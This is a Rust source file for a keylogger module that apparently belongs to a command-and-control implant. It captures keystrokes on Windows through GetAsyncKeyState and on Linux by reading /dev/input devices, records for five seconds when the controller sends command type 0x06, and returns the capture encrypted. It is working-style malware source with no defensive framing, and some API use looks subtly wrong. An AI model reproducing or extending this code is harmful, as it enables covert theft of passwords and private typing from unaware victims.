//! Keylogger module — cross-platform keyboard capture.
//!
//! Captures keystrokes using platform-specific APIs:
//! - Windows: GetAsyncKeyState + GetKeyState
//! - Linux: /dev/input/event* or evdev crate
//! - macOS: CGEventTap (requires accessibility permission)

use anyhow::Result;
use tracing::{debug, info};

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;

/// Keylogger module
pub struct KeyloggerModule {
    buffer: std::sync::Arc<std::sync::Mutex<Vec<u8>>>,
    flush_threshold: usize,
}

impl KeyloggerModule {
    pub fn new() -> Self {
        Self {
            buffer: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
            flush_threshold: 1024,
        }
    }

    /// Capture a single key press (platform-specific)
    #[cfg(windows)]
    fn capture_key(&self, key_code: u32) -> Result<Vec<u8>, ModuleError> {
        use windows::Win32::UI::WindowsAndMessaging::{
            GetAsyncKeyState, GetKeyState, GetKeyboardLayout, ToUnicodeW, MAPVK_VK_TO_VSC,
        };
        use windows::Win32::Foundation::{MapVirtualKeyW, HKL};

        let mut state = [0u8; 256];
        unsafe {
            // Get async key state
            let async_state = GetAsyncKeyState(key_code as i32);
            // Get key state
            let _key_state = GetKeyState(key_code as i32);

            // Check if key was pressed (high bit set)
            if async_state & 0x8000 != 0 {
                // Map virtual key to character
                let mut lpstr = [0u16; 16];
                let keyboard_layout: HKL = GetKeyboardLayout(0);
                let scan_code = MapVirtualKeyW(key_code as u32, MAPVK_VK_TO_VSC);
                let chars = ToUnicodeW(
                    key_code as u32,
                    scan_code,
                    &state,
                    &mut lpstr,
                    lpstr.len() as i32,
                    keyboard_layout,
                );

                if chars > 0 {
                    let text = String::from_utf16_lossy(&lpstr[..chars as usize]);
                    let mut buf = self.buffer.lock().unwrap();
                    buf.extend_from_slice(text.as_bytes());
                    debug!("Key captured: {:?}", text);
                } else {
                    // Non-character key (function keys, arrows, etc.)
                    let special = match key_code {
                        8 => "[BACK]",
                        9 => "[TAB]",
                        13 => "[ENTER]",
                        27 => "[ESC]",
                        32 => " ",
                        33 => "[PGUP]",
                        34 => "[PGDN]",
                        35 => "[END]",
                        36 => "[HOME]",
                        37 => "[LEFT]",
                        38 => "[UP]",
                        39 => "[RIGHT]",
                        40 => "[DOWN]",
                        45 => "[INS]",
                        46 => "[DEL]",
                        _ => return Ok(Vec::new()),
                    };
                    let mut buf = self.buffer.lock().unwrap();
                    buf.extend_from_slice(special.as_bytes());
                    debug!("Special key: {}", special);
                }
            }
        }

        Ok(Vec::new())
    }

    #[cfg(target_os = "linux")]
    fn capture_key(&self, _key_code: u32) -> Result<Vec<u8>, ModuleError> {
        // Linux: read from /dev/input/event*
        // For now, use evdev crate if available
        #[cfg(feature = "keylogger-linux")]
        {
            use evdev::{Device, EventType, Key};

            // Find input devices
            for path in evdev::enumerate() {
                if let Ok(mut device) = Device::open(&path) {
                    let caps = device.capabilities();
                    if caps.keys().contains(&Key(Key::CODE0)) {
                        // This is a keyboard
                        if let Some(event) = device.fetch_events().next() {
                            if event.event_type == EventType::KEY {
                                let mut buf = self.buffer.lock().unwrap();
                                buf.push(event.code as u8);
                                debug!("Linux key event: code={}", event.code);
                            }
                        }
                    }
                }
            }
        }

        #[cfg(not(feature = "keylogger-linux"))]
        {
            // Fallback: read from /dev/input/event*
            use std::fs;
            use std::io::Read;

            for entry in fs::read_dir("/dev/input/")
                .ok()
                .into_iter()
                .flatten()
                .filter_map(|e| e.ok())
            {
                let path = entry.path();
                if path.to_string_lossy().starts_with("/dev/input/event") {
                    if let Ok(mut file) = std::fs::File::open(&path) {
                        let mut buf = [0u8; 64];
                        if let Ok(n) = file.read(&mut buf) {
                            if n > 0 {
                                let mut self_buf = self.buffer.lock().unwrap();
                                self_buf.extend_from_slice(&buf[..n.min(8)]);
                            }
                        }
                    }
                }
            }
        }

        Ok(Vec::new())
    }

    #[cfg(target_os = "macos")]
    fn capture_key(&self, _key_code: u32) -> Result<Vec<u8>, ModuleError> {
        // macOS: use CGEventTap
        // Requires accessibility permission
        Ok(Vec::new())
    }

    /// Flush captured keystrokes
    fn flush(&self) -> Result<Vec<u8>, ModuleError> {
        let mut buf = self.buffer.lock().map_err(|_| ModuleError::PermissionDenied)?;
        let data = buf.drain(..).collect();
        Ok(data)
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for KeyloggerModule {
    fn name(&self) -> &str {
        "keylogger"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x06 {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        // Capture keystrokes for a brief period
        let capture_duration = std::time::Duration::from_secs(5);
        let end_time = std::time::Instant::now() + capture_duration;

        while std::time::Instant::now() < end_time {
            #[cfg(windows)]
            {
                // Scan all virtual key codes
                for vk in 0x01..=0xFF {
                    self.capture_key(vk)?;
                }
            }

            #[cfg(target_os = "linux")]
            {
                self.capture_key(0)?;
            }

            #[cfg(target_os = "macos")]
            {
                self.capture_key(0)?;
            }

            std::thread::sleep(std::time::Duration::from_millis(10));
        }

        // Flush captured keys
        let keys = self.flush()?;

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(&keys, &cmd.crypto_key);

        info!("Keylogger captured {} bytes", keys.len());
        Ok(encrypted)
    }
}
